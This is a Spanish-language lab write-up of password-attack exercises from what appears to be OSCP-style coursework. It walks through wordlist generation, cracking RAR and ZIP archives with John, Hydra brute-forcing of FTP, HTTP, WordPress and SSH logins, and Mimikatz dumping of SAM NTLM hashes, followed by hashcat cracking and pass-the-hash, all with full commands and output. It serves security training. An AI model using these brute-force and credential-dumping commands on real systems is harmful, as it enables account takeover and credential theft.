+
+<p><br /></p>
+
+<p><strong>1. Enumerate VM #2 and find a way to get access to SSH on port 2222. Find the flag of the user you used for the SSH connection. You can use the same rules we created in this section.</strong></p>
+
+<p><br /></p>
+
+<p><strong>2. You found this encrypted file flag.rar after gaining access to the manager of MegaCorp One’s /challenge folder on the VM #1 while conducting a pentest on the company. You previously identified a couple of his other passwords including nanomedicines234 and Cyberisation649 where nanomedicines and Cyberisation both are products of MegaCorp (words) that can be found on their website www.megacorpone.com. You also know the password requirement is at least 12 characters with 3 digits. Use this information to generate a custom wordlist to crack this zip file and get the flag.</strong></p>
+
+<p>En primer lugar, vamos a intentar crackear la contraseña utilizando la herramienta <em>JohnTheRipper</em>, para ello pasamos el formato de la contraseña a uno que John pueda entender para crakear la misma con <em>rar2john</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rar2john flag.rar <span class="o">&gt;</span> flag.txt
+</code></pre></div></div>
+
+<p>Seguidamente, formamos la lista de candidatos a contraseñas utilizando las siguientes herramientas, <em>cewl</em> y <em>crunch</em>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -d 5 -m 9 www.megacorpone.com &gt; mega.txt
+</code></pre></div></div>
+
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 3 3 -t %%% &gt; numbers.txt
+</code></pre></div></div>
+
+<p>Y por último combinamos ambas listas:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/lib/hashcat-utils/combinator.bin mega.txt numbers.txt &gt; wordlist.txt
+</code></pre></div></div>
+
+<p>Ahora con la lista de diccionario creada lanzamos JohnTheRipper sobre el fichero que contiene el hash de la contraseña que protege el fichero .rar:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=wordlist.txt flag.txt  
+</code></pre></div></div>
+
+<p>Transcurrido un tiempo obtendremos la contraseña.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=wordlist.txt flag.txt                                    
+Using default input encoding: UTF-8
+Loaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])
+Cost 1 (iteration count) is 32768 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+regeneration416  (flag.rar)     
+1g 0:00:00:52 DONE (2023-03-07 11:36) 0.01888g/s 386.7p/s 386.7c/s 386.7C/s regeneration416..regeneration479
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>3.  You found this encrypted file <em>flag.zip</em> after gaining access to a manager’s <em>/challenge</em> folder while conducting a pentest on the target VM #2. You previously identified several of her other passwords including <em>bella9221!!</em> and <em>charlie2323##</em> where <em>rosie</em> and <em>bailey</em> are the names of two of her pets. Looking at her social media, you find out she has a third pet named <em>buddy</em>. Use this information to generate a custom wordlist to open this file and get the flag.</strong></p>
+
+<p>De nuevo, nos logeamos en la máquina y mediante SCP transferimos el “flag.zip”  a nuestra máquina local. Seguidamente, transformamos el hash de la contraseña que protege el .zip a uno que john pueda leer con <em>zip2john</em>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john flag.zip &gt; flag.txt
+</code></pre></div></div>
+
+<p>Y seguidamente pasamos a formar la lista y crakear la contraseña:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 7 7 -t d%%%%^^ -p bailey rosie buddy &gt; wordlist.txt
+Crunch will now generate approximately the following amount of data: 805860000 bytes
+768 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 65340000 
+
+
+john --wordlist=wordlist.txt flag2.txt                    
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+buddy3125,,      (flag.zip/flag.txt)     
+1g 0:00:00:02 DONE (2023-03-07 13:51) 0.4405g/s 11097Kp/s 11097Kc/s 11097KC/s buddy3124^*..buddy3131:~
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>4.  After enumerating the target VM #3, you will find an FTP server running that is available remotely. Use a password attack technique to log into this FTP server with the user <em>offsec</em> while keeping the number of workers not above 3.</strong></p>
+
+<p>Empleamos Hydra para hacer un bruteforce sobre el servicio FTP descubierto con un escaneo previo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.187.52 -l offsec -P /usr/share/wordlists/rockyou.txt -t 3 -vv ftp
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[...]
+
+[21][ftp] host: 192.168.187.52   login: offsec   password: buster
+[STATUS] attack finished for 192.168.187.52 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 14:23:26
+</code></pre></div></div>
+
+<p>Seguidamente, utilizamos estas credenciales para logearnos dentro del servicio y obtener la flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp offsec@192.168.187.52
+Connected to 192.168.187.52.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 50 allowed.
+220-Local time is now 14:25. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+331 User offsec OK. Password required
+Password: 
+230 OK. Current directory is /
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Extended Passive mode OK (|||29059|)
+ftp: Can't connect to `192.168.187.52:29059': Connection refused
+200 PORT command successful
+150 Connecting to port 41983
+-r--r-----    1 1001       ftpgroup           37 Mar  7 14:05 flag.txt
+ftp&gt; more flag.txt
+OS{57286839806732c921b056b2f40ef7a3}
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>5.  Use a password attack technique against the target VM #4 to log into the website with the <em>offsec</em> user.</strong></p>
+
+<p>La web utiliza un sistema de logeo basado en http-auth. En primera instancia podemos caer en la tentación de emplear un ‘http-post-form’:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.187.52 http-post-form "/:username=^USER^&amp;password=^PASS^&amp;submit=submit:Unauthorized" -l offsec -P /usr/share/wordlists/rockyou.txt -vv 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 15:19:52
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.187.52:80/:username=^USER^&amp;password=^PASS^&amp;submit=submit:Unauthorized
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
+</code></pre></div></div>
+
+<p>Pero en seguida se nos comunica que el formato utilizado no es válido y que utilicemos ‘http-get’. Así, empleamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.187.52 http-get -l offsec -P /usr/share/wordlists/rockyou.txt -vv 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 15:22:17
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://192.168.187.52:80/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[80][http-get] host: 192.168.187.52   login: offsec   password: pamela
+[STATUS] attack finished for 192.168.187.52 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 15:22:31
+</code></pre></div></div>
+
+<p>Nos logeamos y recuperamos la flag.</p>
+
+<p><br /></p>
+
+<p><strong>6.  You have found this list of possible employee username on target VM #5 inside the <em>users.txt</em> file on the web server’s root path. Use this list and a password attack technique to log into this website.</strong></p>
+
+<p>Acudimos a <em>http://&lt;IP&gt;/users.txt</em> y obtenemos la lista de posibles usuarios. De esta forma, la copiamos sobre un fichero <em>users.txt</em>, seguidamente acudimos a la página http://&lt;IP&gt;/wp-login.php.</p>
+
+<p>Una vez en la página activamos DevTools y acudimos a la pestaña de Network, realizamos una request de logeo y pinchamos sobre la request que es un tipo post y vamos dentro de la pestaña Network a la pestaña Request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/pen/Pasted%20image%2020230308112923.png" text-align="center" />
+</div>
+
+<p>Así, con esto obtenemos los parámetros de la post-request y formamos el siguiente comando con hydra:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.227.52 http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&amp;testcookie=1:Unknown username. Check again or try your email address."</span> <span class="nt">-L</span> users.txt <span class="nt">-p</span> TEST <span class="nt">-vv</span>
+</code></pre></div></div>
+
+<p>Observemos que el valor del parámetro ‘redirect_to’ esta codificado en URL.</p>
+
+<p>Además, debemos fijarnos en el mesnaje de error que devuelve la página “Unknown username.” De esta forma, primero detectamos un nombre de uusario valido:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.227.52 http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&amp;testcookie=1:Unknown username. Check again or try your email address." -L users.txt -p TEST -vv -t 12
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 05:48:31
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 43 login tries (l:43/p:1), ~4 tries per task
+[DATA] attacking http-post-form://192.168.227.52:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&amp;testcookie=1:Unknown username. Check again or try your email address.
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[80][http-post-form] host: 192.168.227.52   login: jeremy   password: TEST
+[STATUS] attack finished for 192.168.227.52 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+</code></pre></div></div>
+
+<p>Y ahora, procedemos a descubrir la contraseña del usuario:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.227.52 http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&amp;testcookie=1:Error" -l jeremy -P /usr/share/wordlists/rockyou.txt -vv -t 12 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 05:52:41
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task
+[DATA] attacking http-post-form://192.168.227.52:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.227.52%2Fwp-admin%2F&amp;testcookie=1:Error
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] Page redirected to http[s]://192.168.227.52:80/wp-admin/
+[VERBOSE] Page redirected to http[s]://192.168.227.52:80/wp-login.php?redirect_to=http%3A%2F%2F192.168.227.52%3A80%2Fwp-admin%2F&amp;reauth=1
+[80][http-post-form] host: 192.168.227.52   login: jeremy   password: chicken
+[STATUS] attack finished for 192.168.227.52 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 05:52:50
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>7.  Use a password attack technique to log into the target VM #6 via SSH with the user <em>offsec</em>.</strong></p>
+
+<pre><code class="language-BASH">hydra 192.168.227.52 -l offsec -P /usr/share/wordlists/rockyou.txt -t 20 ssh -s 2222
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 06:01:39
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 20 tasks per 1 server, overall 20 tasks, 14344399 login tries (l:1/p:14344399), ~717220 tries per task
+[DATA] attacking ssh://192.168.227.52:2222/
+[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344235 to do in 1440:12h, 18 active
+[2222][ssh] host: 192.168.227.52   login: offsec   password: 00000
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 06:02:55
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>8.  The <em>shadow man</em> admin messed up the configurations on the target VM #7 server and gave you access to see something he shouldn’t have. Can you use this access to read the flag?</strong></p>
+
+<p>Nos logeamos en la máquina con student:lab en el puerto 2222 a través de ssh y copiamos la lista de contraseñas del ficheor ‘passwords.txt’ y la utilizamos junto con hydra para descubrir la contraseña del usuario ‘shadow-man’:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.227.52 -l shadow-man -P wordlist.txt -vv -s 2222 ssh -t 10 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 06:15:37
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 196 login tries (l:1/p:196), ~20 tries per task
+[DATA] attacking ssh://192.168.227.52:2222/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://shadow-man@192.168.227.52:2222
+[INFO] Successful, password authentication is supported by ssh://192.168.227.52:2222
+[STATUS] 100.00 tries/min, 100 tries in 00:01h, 96 to do in 00:01h, 10 active
+[2222][ssh] host: 192.168.227.52   login: shadow-man   password: rafael
+[STATUS] attack finished for 192.168.227.52 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 06:17:25
+</code></pre></div></div>
+
+<p>Así, una vez dsabemos la contraseña, obtenemos la flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su shadow-man
+Password: 
+shadow-man@abbb05bd4e0d:~$ cat flag.txt
+OS{a7cb3701aa683cef1890bbecfc8ebfeb}
+shadow-man@abbb05bd4e0d:~$ 
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="213-working-with-password-hashes">21.3. Working with Password Hashes</h3>
+
+<h4 id="2131-cracking-ntlm-mimikatz">21.3.1. Cracking NTLM, Mimikatz.</h4>
+
+<p>NTLM user authentication, es un protocolo de autenticación propio de Windows de tipo Challenge/Reponse. Concretamente, NTLM plantea a un cliente que quiere autenticarse un reto.</p>
+
+<ul>
+  <li>
+    <p>Primero al cliente se le envía un string, un reto.</p>
+  </li>
+  <li>
+    <p>El cliente pide al usuario su contraseña y utiliza el hash de la misma en un algoritmo para transformar el string y reenviarlo al servidor.</p>
+  </li>
+  <li>
+    <p>El servidor a su vez recoge el string transformado del cliente y con el hash de la contraseña del usuario almacenada en el mismo servidor transforma su propio string y compara ambos strings transformados.</p>
+  </li>
+  <li>
+    <p>Si coinciden el cliente ha superado el reto y por tanto ha aportado unas credenciales válidas y si no coinciden el cliente no supera el reto y por tanto no se logea.</p>
+  </li>
+</ul>
+
+<p>Por otra parte, Windows guarda los hashes de contraseñas (en NTLM sin salt, los saltos son bits random que se adhieren al final de una contraseña antes de proceder a su hasheo y están diseñados para ) en el Security Account Manager o SAM database en <em>C:\Windows\system32\config\sam</em>.</p>
+
+<p>Estos archivos no pueden ser movidos o copiados de su localización mientras el sistema operativo se ejecuta ya que Windows implementa un bloqueo de ficheros.</p>
+
+<p>Afortunadamente, podemos usar la herramienta <em>Mimikatz</em> para hacer el trabajo pesado por nosotros y eludir esta restricción. Mimikatz proporciona la funcionalidad para extraer contraseñas de texto sin formato y hash de contraseñas de varias fuentes en Windows y aprovecharlas en otros ataques como <em>pass-the-hash</em>. Mimikatz también incluye el módulo <em>sekurlsa</em> , que extrae hashes de contraseñas de la memoria de proceso del <em>Subsistema de Autoridad de Seguridad Local</em> (LSASS). LSASS es un proceso en Windows que maneja la autenticación de usuario, los cambios de contraseña y la creación del <em>access token</em>.</p>
+
+<p>LSASS es importante debido a que almacena en caché hashes NTLM y otras credenciales que podemos extraer usando el módulo ‘sekurlsa’ Mimikatz. Necesitamos entender que LSASS se ejecuta bajo el usuario del SYSTEM y, por lo tanto, tiene incluso más privilegios que un proceso iniciado como Administrador.</p>
+
+<p>Debido a esto, solo podemos extraer contraseñas si:</p>
+
+<ul>
+  <li>Estamos ejecutando Mimikatz como Administrador (o superior)</li>
+  <li>Tenemos habilitado el derecho de acceso <em>SeDebugPrivilege</em>. Este derecho de acceso nos otorga la capacidad de debugear no solo los procesos que poseemos, sino también los procesos de todos los demás usuarios.</li>
+</ul>
+
+<p>También podemos elevar nuestros privilegios a la cuenta <em>SYSTEM</em> con herramientas como <em>PsExec</em> o la función de <em>elevación de token Mimikatz</em> incorporada para obtener los privilegios requeridos. La función de elevación del token requiere el derecho de acceso <em>SeImpersonatePrivilege</em> para funcionar, pero todos los administradores locales lo tienen por defecto.</p>
+
+<p>Ahora que tenemos una comprensión básica de qué son los hashes NTLM y dónde podemos encontrarlos, demostremos cómo obtenerlos y descifrarlos.</p>
+
+<p>Recuperaremos las contraseñas del SAM de la máquina MARKETINGWK01 en 192.168.50.210. Podemos iniciar sesión en el sistema a través de RDP como usuario <em>offsec</em>, utilizando <em>lab</em> como contraseña.</p>
+
+<p>Comenzaremos usando <em>Get-LocalUser</em> para verificar qué usuarios existen localmente en el sistema.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\offsec&gt; Get-LocalUser
+
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nelly              True
+offsec             True
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
+...
+</code></pre></div></div>
+
+<p>El resultado del Listado 37 indica la existencia de otro usuario llamado <em>nelly</em> en el sistema MARKETINGWK01. Nuestro objetivo en este ejemplo es obtener la contraseña de texto sin formato de <em>nelly</em> recuperando el hash NTLM y crakeandolo.</p>
+
+<p>Ya sabemos que las credenciales de los usuarios se almacenan cuando inician sesión en un sistema Windows, pero las credenciales también se almacenan de otras formas. Por ejemplo, las credenciales también se almacenan cuando se ejecuta un servicio con una cuenta de usuario.</p>
+
+<p>Usaremos Mimikatz (ubicado en <strong>C:\tools\mimikatz.exe</strong> ) para verificar las credenciales almacenadas en el sistema. Comencemos PowerShell como administrador haciendo clic en el ícono de Windows en la barra de tareas y escribiendo “powershell”. Seleccionaremos <em>Windows PowerShell</em> y haremos clic en <em>Ejecutar como administrador</em> como se muestra en la siguiente figura. Confirmaremos la ventana emergente <em>del Control de cuentas de usuario</em> (UAC) haciendo clic en <em>Sí</em> .</p>
+
+<p>En la ventana de PowerShell, cambiaremos a <strong>C:\tools</strong> e iniciaremos Mimikatz.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; cd C:\tools
+
+PS C:\tools&gt; ls
+
+    Directory: C:\tools
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe
+
+PS C:\tools&gt; .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #
+</code></pre></div></div>
+
+<p>Según el indicador, Mimikatz se está ejecutando y podemos interactuar con él a través de su entorno de línea de comandos. Cada comando consta de un módulo y un comando delimitado por dos puntos, por ejemplo, <strong>privilege::debug</strong>.</p>
+
+<p>Podemos usar varios comandos para extraer contraseñas del sistema. Uno de los comandos más comunes de Mimikatz es <strong>sekurlsa::logonpasswords</strong> , que intenta extraer contraseñas de texto sin formato y hash de contraseñas de todas las fuentes disponibles. Dado que esto genera una gran cantidad de resultados, en su lugar usaremos <strong>lsadump::sam</strong> , que extraerá los hashes NTLM del SAM. Para este comando, primero debemos ingresar <strong>token::elevate</strong> para elevar a los privilegios de usuario del SISTEMA.</p>
+
+<p>Para ambos comandos, <strong>sekurlsa::logonpasswords</strong> y <strong>lsadump::sam</strong> , debemos tener habilitado el derecho de acceso SeDebugPrivilege, lo cual lograremos con <strong>privilegio::debug</strong> .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -&gt; Impersonated !
+ * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+ 
+mimikatz # lsadump::sam
+Domain : MARKETINGWK01
+SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
+Local SID : S-1-5-21-4264639230-2296035194-3358247000
+ 
+RID  : 000003e9 (1001)
+User : offsec
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+ 
+RID  : 000003ea (1002)
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+...
+</code></pre></div></div>
+
+<p>El resultado muestra que habilitamos con éxito el derecho de acceso SeDebugPrivilege y obtuvimos privilegios de usuario del SISTEMA. La salida del comando <strong>lsadump::sam</strong> revela dos hashes NTLM, uno para <em>offsec</em> y otro para <em>nelly</em> . Como ya sabemos que el hash NTLM de <em>offsec</em> se calculó a partir de la contraseña de texto sin formato “lab”, lo omitiremos y nos centraremos en el hash NTLM <em>de Nelly</em> .</p>
+
+<p>Copiemos el hash NTLM y péguelo en <strong>nelly.hash</strong> en el directorio <strong>passwordattacks</strong> de nuestra máquina Kali.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ cat nelly.hash     
+3ae8e5f0ffabb3a627672e1600f1ba10
+</code></pre></div></div>
+
+<p>A continuación, recuperaremos el modo hash correcto de la salida de ayuda de Hashcat.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"   
+                                                                            
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
+   5600 | NetNTLMv2                                           | Network Protocol
+  27100 | NetNTLMv2 (NT)                                      | Network Protocol
+   1000 | NTLM                                                | Operating System
+</code></pre></div></div>
+
+<p>La salida indica que el modo correcto es 1000.</p>
+
+<p>Ahora tenemos todo lo que necesitamos para comenzar a descifrar el hash NTLM. Ya extrajimos el hash porque Mimikatz genera un formato que acepta Hashcat. El siguiente paso es elegir una lista de palabras y un archivo de reglas. Para este ejemplo, usaremos la lista de palabras <strong>rockyou.txt</strong> con el archivo de reglas <strong>best64.rule , que contiene 64 reglas efectivas.</strong></p>
+
+<p>Proporcionemos todos los argumentos y valores al comando <strong>hashcat</strong> para iniciar el proceso de craqueo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat (v6.2.5) starting
+...
+3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
+                                                          
+Session..........: hashca
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
+Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
+Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
+...
+</code></pre></div></div>
+
+<p>El resultado muestra que desciframos con éxito el hash NTLM del usuario <em>nelly</em> . La contraseña de texto sin formato utilizada para crear este hash es <em>nicole1</em> . Confirmemos esto conectándonos al sistema con RDP.</p>
+
+<p><br /></p>
+
+<p><strong>2. Access VM #2 via RDP as user <em>nadine</em> with the password retrieved in the exercise of the section labelled “Password Manager” and leverage the methods from this section to extract the NTLM hash of the user <em>steve</em>. Use best64.rule for the cracking process and enter the plain text password as answer to this exercise.</strong></p>
+
+<p>Primero accedemos como el usuario Nadine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /v:192.168.221.227 /u:nadine /p:123abc
+</code></pre></div></div>
+
+<p>Seguidamente, empleamos Mimikatz y obtenemos el hash NTLM del usuario steve iniciando una CMD como administrador.</p>
+
+<p>Seguidamente, guardamos dicho hash en un fichero y lo crackeamos con Hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
+2835573fb334e3696ef62a00e5cf7571:francesca77
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="2132-passing-ntml">21.3.2. Passing NTML.</h4>
+
+<p>En ocasiones, el crackeo the contraseñas NTLM puede ser inviable debido a la fortaleza de la contraseña. Sin embargo, aún podemos aprovecharnos de un NTLM hash sin necesidad de crackearlo a través de la técnica <em>pass-the-hass</em>.</p>
+
+<p>Esta técnica consiste en realizar un intento de autenticación en un servicio probando una combinación del username y el hash de la contraseña en lugar de la contraseña en texto plano.</p>
+
+<p>Esto es posible entre otras cosas gracias a que los hashes NTLM/LM no añaden salts y permanecen estáticos entre sesiones e incluso entre dispositivos, en la medida en la que las credenciales (username:password) sean las mismas tendrán el mismo NTLM hash en distintos dispositivos.</p>
+
+<p>Además, para conseguir RCE necesitamos que la cuenta a la que accedemos tenga privilegios administrativos, de lo contrario la técnica todavía es posible pero la máquina debe tener una configuración específica que puede no ser frecuente. Más especificamente, sucede que desde Windows Vista, todas las versiones de Microsoft Windows poseen restricciones de la UAC (User Account Control) habilitadas por defecto. A su vez, estas restricciones están orientadas a prevenir el acceso de software desconocido a privilegios administrativos sin consentimiento previo y tiene un efecto considerable mitigando nuestro ataque de <em>pash-the-hash</em>.</p>
+
